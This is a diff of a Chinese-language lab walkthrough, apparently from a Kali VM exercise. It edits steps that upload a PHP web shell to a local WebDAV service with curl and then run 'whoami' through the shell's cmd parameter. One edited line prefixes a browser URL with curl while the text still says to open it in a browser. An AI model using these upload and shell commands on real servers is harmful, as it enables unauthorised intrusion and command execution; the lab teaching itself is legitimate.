@@ -65,7 +65,7 @@
 1. **嘗試上傳木馬：**  
    - 使用 curl 嘗試將 `shell.php` 上傳到目標服務（假設 WebDAV 允許匿名上傳）：
      ```bash
-     curl -T shell.php http://127.0.0.1:10088/
+     curl -T shell.php http://127.0.0.1:10088/dav/
      ```
    - 若上傳成功，`shell.php` 應位於服務的根目錄。
 
@@ -76,7 +76,7 @@
 1. **測試木馬：**  
    - 在 Kali VM 的瀏覽器中訪問以下 URL：
      ```
-     http://127.0.0.1:10088/shell.php?cmd=whoami
+     curl http://127.0.0.1:10088/shell.php?cmd=whoami
      ```
    - 若返回執行結果（例如 Apache 的運行使用者），則表示成功利用漏洞執行命令。
 
